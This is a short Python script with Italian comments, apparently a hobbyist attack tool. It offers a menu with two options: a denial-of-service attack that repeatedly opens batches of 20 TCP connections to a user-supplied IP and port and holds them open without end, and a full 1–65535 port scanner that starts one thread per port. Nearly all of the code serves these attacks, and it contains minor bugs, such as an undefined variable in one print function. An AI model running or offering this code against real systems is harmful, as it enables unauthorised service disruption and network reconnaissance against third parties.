import socket
import threading
import time
import random
import sys
NUM_CONNECTIONS = 20
dd = 1024 * 1024  # 1 MB di dati casuali
extra_data = random._urandom(dd)
ip = ""
portad = 0

# Funzione che apre una connessione e la lascia aperta
def open_connection():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, portad))
        # Invia i dati in piccoli blocchi per evitare di saturare la rete
        #chunk_size = 4096
        #for i in range(0, len(extra_data), chunk_size):
            #s.send(extra_data[i:i + chunk_size])
            #time.sleep(0.01)  # Breve pausa tra l'invio dei blocchi
            
        # La connessione viene lasciata aperta e incompleta
        while True:
            time.sleep(1)
    except Exception as e:
        print("[+] Server down.")

# Funzione principale che gestisce le connessioni
def connect(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)  # Timeout di 1 secondo
        s.connect((ip, port))
        s.close()
        print(f"Port {port} open.")
    except:
        pass

def portscan():
    threads = []
    for i in range(1, 65536):
        t = threading.Thread(target=connect, kwargs={'port': i})
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print("[+] Scan finished.")
    
def print_attacks():
    print(f"Connessionni aperte: {str(attacks)}\r")   
    
conns = 0    

def start_dos():
    try:
        threadsa = []
        for _ in range(NUM_CONNECTIONS):
            t = threading.Thread(target=open_connection)
            t.start()
            threadsa.append(t)
        print("[+] 20 nuove connessioni aperte")
    except KeyboardInterrupt:
        sys.exit()





if __name__ == "__main__":
    choice = input("type 1 to dos,\ntype 2 to portscan\n>")
    if choice == "1":
        TARGET_HOST = input("Ip> ")
        ip = TARGET_HOST
        TARGET_PORT = int(input("Port> "))
        portad = TARGET_PORT
        print("[+] Attacco iniziato")
        c = 0
        while (KeyboardInterrupt):
            if (c <= 250):
                start_dos()
                c += 20
            else:
                c = 0
                print("Sleeping for 1 second")
                time.sleep(1)
        
    if choice == "2":
        ipa = input("Ip to scan> ")
        ip = ipa
        portscan()
        time.sleep(1)
